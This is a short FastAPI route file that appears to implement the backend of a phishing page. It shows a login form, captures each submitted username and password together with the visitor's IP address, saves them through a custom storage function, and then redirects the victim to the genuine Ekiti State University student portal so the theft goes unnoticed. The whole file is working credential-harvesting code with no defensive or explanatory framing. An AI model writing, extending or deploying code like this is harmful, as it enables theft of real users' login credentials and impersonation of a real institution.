from fastapi import APIRouter, Form, Request
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse, RedirectResponse
from app.db.database import save_credentials  # Your custom save function

router = APIRouter()
templates = Jinja2Templates(directory="app/templates")

@router.get("/login", response_class=HTMLResponse)
async def show_login(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@router.post("/login")
async def process_login(request: Request, username: str = Form(...), password: str = Form(...)):
    ip_address = request.headers.get("x-forwarded-for")
    if ip_address:
        ip_address = ip_address.split(",")[0]
    else:
        ip_address = request.client.host

    print(f"[DEBUG] Real IP: {ip_address}")
    save_credentials(username, password, ip_address)
    return RedirectResponse(url="https://eksuportal.eksu.edu.ng", status_code=302)


